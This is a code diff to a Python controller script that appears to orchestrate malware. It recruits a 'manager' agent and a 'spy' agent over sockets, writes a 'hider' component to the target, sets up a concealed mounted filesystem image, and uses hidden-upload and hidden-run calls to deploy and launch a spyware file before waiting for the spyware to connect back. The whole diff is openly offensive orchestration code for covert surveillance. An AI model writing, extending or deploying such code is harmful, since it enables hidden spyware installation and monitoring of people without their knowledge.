@@ -9,6 +9,8 @@ from structParams import *
 from agentRecruiter import AgentRecruiter
 import threading
 import configparser
+from operation import Operation
+from icecream import ic
 
 
 HOST = "localhost"
@@ -22,34 +24,43 @@ def main():
     image_path = "fs.iso"
     mount_path = "fs"
 
-    agents = list()
-    recrutionEvent = threading.Event()
-    recruiter = AgentRecruiter(HOST, PORT_MANEGER, agents, recrutionEvent)
-    recruiter.start()
+    operDict: dict[str, Operation] = dict()
+    # recrutionEvent = threading.Event()
+    manegerRecruiter = AgentRecruiter(HOST, PORT_MANEGER, operDict, "maneger")
+    spyRecruiter = AgentRecruiter(HOST, PORT_SPYWARE, operDict, "spy")
+    manegerRecruiter.start()
+    spyRecruiter.start()
 
-    while len(agents) == 0:
+    while len(operDict) == 0:
         sleep(1)
+    sleep(1)
+    ic(operDict)
+    op: Operation = list(operDict.values())[0]
+    ic(op)
+    ic(op.managerAgent)
+    ic(op.spyAgent)
 
-    agent: Agent = agents.pop()
+    manegerAgent: Agent = op.managerAgent
 
     print(
-        agent.write_file(
+        manegerAgent.write_file(
             "hider",
             targetHiderPath,
         )
     )
 
-    print(agent.hider_setup(targetHiderPath, image_path, mount_path))
+    print(manegerAgent.hider_setup(targetHiderPath, image_path, mount_path))
 
     print(
-        agent.hidden_action_with_upload(
+        manegerAgent.hidden_action_with_upload(
             FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
             "spyware",
-            "sentSpyware6.spy",
+            "sentSpyware9.spy",
         )
     )
-
-    spyAgent = Agent.listenSpyware((HOST, PORT_SPYWARE))
+    while op.spyAgent is None:
+        sleep(1)
+    spyAgent: Agent = op.spyAgent
 
     print(spyAgent.hider_setup(targetHiderPath, image_path, mount_path))
 
